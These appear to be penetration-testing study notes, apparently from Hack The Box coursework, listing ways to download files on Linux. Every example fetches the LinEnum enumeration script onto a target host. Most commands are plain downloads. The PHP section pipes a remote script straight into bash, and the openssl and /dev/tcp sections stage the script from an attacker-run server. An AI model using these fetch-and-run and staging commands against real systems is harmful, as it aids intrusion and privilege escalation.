# Linux File Transfer Methods

## SCP

### Download file via SCP from a remote server
````bash
scp <user>@<IP-ADDRESS>:/path/to/file <output_file_on_system>
````
### Upload file via SCP to a remote system
````bash
scp <local_file_on_system> <user>@<IP-ADDRESS>:/path/for/uploaded_file
````

## Wget / cURL

Wget and cURL are installed on many Linux distributions and support uploading as well as downloading files.
````bash
Ryohei@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
````
````bash
Ryohei@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
````

## OpenSSL

OpenSSL is frequently installed and is also often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

### Create certificate
````bash
Ryohei@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
````
### Stand up server
````bash
Ryohei@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
````
### Download file
````bash
Ryohei@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
````
## Bash (/dev/tcp)
There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads.

### Connect to Target's Webserver
````bash
Ryohei@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
````
### HTTP GET Request
````bash
Ryohei@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
````
### Print the Response
````bash
Ryohei@htb[/htb]$ cat <&3
````

## PHP
PHP is also very prevalent and provides multiple file transfer methods.

### File_get_contents()
````bash
Ryohei@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
````
### Fopen()
````bash
Ryohei@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
````
If the php-curl module has been installed, this can alternatively be used.

### Php-curl
````
Ryohei@htb[/htb]$ php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
````
It is also possible to retrieve each line as an array and pipe the output to bash.

````
Ryohei@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
````

## Python
Python is often present on Linux and can be used to download files when Wget and cURL are not available. Although Python isn’t currently installed by default in Windows, typing Python in a command prompt opens the Windows Store's official distribution with a single-click install. Python is frequently installed on developer and IT computers and is bundled by default with major business financial applications such as Bloomberg (Bloomberg Professional Services).

### Python 2
````bash
Ryohei@htb[/htb]$ python2
````
````python
import urllib
urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
````
### Python 3
````bash
Ryohei@htb[/htb]$ python3
````
````python
import urllib.request
urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
````

## Other Languages
Ruby, Perl, and Golang are some other popular languages that can also transfer files.

### Ruby
````bash
Ryohei@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
````
### Perl
````bash
Ryohei@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
````
### Go
````go
package main

import (
	 "os"
     "io"
     "net/http"
)

func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}
````
